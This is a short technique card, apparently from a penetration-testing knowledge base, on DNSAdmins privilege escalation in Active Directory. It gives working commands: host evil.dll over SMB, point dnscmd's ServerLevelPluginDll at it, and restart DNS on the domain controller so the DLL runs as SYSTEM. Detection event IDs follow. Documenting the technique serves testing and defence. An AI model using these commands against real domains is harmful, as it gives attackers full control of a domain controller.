---
id: dnsadmins
type: technique
label: "DNSAdmins service control"
phase: "privesc"
tools: ["bloodhound", "powerview"]
cve: null
detect: "Monitor DNSAdmins membership, DNS Server service configuration, module/image loads and service restarts on domain controllers."
mitre: null
tag: null
---


# DNSAdmins service control

### Affected object / attribute
**DNS service registry `ServerLevelPluginDll`** on a DC.

### Concept (deep)
`DNSAdmins` can set **`ServerLevelPluginDll`** via RPC. The DNS service runs as **SYSTEM on a DC** and loads the DLL on restart → **SYSTEM code execution on the DC**.

### Attack flow (Mermaid)
```mermaid
flowchart TD
    A[DNSAdmins member] --> B[dnscmd /config /serverlevelplugindll]
    B --> C[Restart DNS service]
    C --> D[SYSTEM loads attacker DLL]
    D --> E[Code execution on DC]
```

### Commands
```bash
# ── Host the DLL ─────────────────────────────────────────────────────
impacket-smbserver share ./dll -smb2support

# ── Point DNS at the DLL ─────────────────────────────────────────────
dnscmd DC01 /config /serverlevelplugindll \\10.10.10.99\share\evil.dll

# ── Restart DNS ──────────────────────────────────────────────────────
sc \\DC01 stop dns
sc \\DC01 start dns
```

### Detection
DNS registry **`ServerLevelPluginDll`** (**4657**); DNS service restart (**7036**); `dns.exe` loading a non-Microsoft DLL (**Sysmon 7**).

---
